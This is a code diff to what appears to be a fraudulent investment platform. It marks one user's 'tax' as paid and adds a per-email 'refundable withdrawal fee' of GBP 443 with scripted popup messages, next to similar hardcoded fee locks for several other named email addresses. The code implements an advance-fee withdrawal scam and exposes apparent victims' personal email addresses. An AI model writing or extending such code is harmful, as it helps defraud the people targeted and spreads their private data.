@@ -150,8 +150,8 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     currentValue: 30000,
     taxRate: 0.165,
     taxDue: 4950,
-    taxRemaining: 4950,
-    taxPaid: 0,
+    taxRemaining: 0,
+    taxPaid: 4950,
     initialHoldings: 500,
     currency: "GBP",
     forceProgressPct: 100,
@@ -352,6 +352,7 @@ function isFaithKirkwoodAccount(email: string): boolean {
 const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
   "ammielcui@gmail.com": { amount: 1275, currency: "GBP" },
   "kas_12@hotmail.co.uk": { amount: 1655, currency: "GBP" },
+  "aurela014@outlook.com": { amount: 443, currency: "GBP" },
   "samlebrun01@gmail.com": { amount: 680, currency: "USD" },
   "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" },
@@ -361,6 +362,8 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "ammielcui@gmail.com": "Withdrawal fee payment required: GBP 1,275.00. Clear this fee to continue.",
   "kas_12@hotmail.co.uk":
     "Tax cleared successfully. A refundable withdrawal fee of GBP 1,655.00 is required to continue with withdrawal.",
+  "aurela014@outlook.com":
+    "Thank you for clearing tax. The last step is a refundable withdrawal fee of GBP 443.00.",
   "ttvcurser@gmail.com":
     "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal.",
   "ajamibilal@yahoo.com":
@@ -396,6 +399,8 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
   "kas_12@hotmail.co.uk":
     "Tax cleared successfully. Please clear the refundable withdrawal fee of GBP 1,655.00 to proceed with withdrawal."
   ,
+  "aurela014@outlook.com":
+    "Thank you for clearing tax. The last step is a refundable withdrawal fee of GBP 443.00.",
   "ttvcurser@gmail.com":
     "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal.",
   "ajamibilal@yahoo.com":
